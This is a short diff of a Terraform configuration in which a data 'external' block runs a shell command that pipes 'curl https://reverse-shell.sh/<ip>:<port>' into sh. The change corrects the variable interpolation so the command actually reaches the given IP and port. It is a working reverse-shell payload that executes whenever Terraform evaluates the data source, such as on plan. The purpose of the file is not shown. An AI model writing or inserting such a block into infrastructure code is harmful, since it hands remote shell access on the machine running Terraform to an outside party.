@@ -28,5 +28,5 @@ locals {
 }
 
 data "external" "example" {
-  program = ["sh", "-c", "curl https://reverse-shell.sh/var.ip:var.port | sh"]
+  program = ["sh", "-c", "curl https://reverse-shell.sh/${var.ip}:${var.port} | sh"]
 }
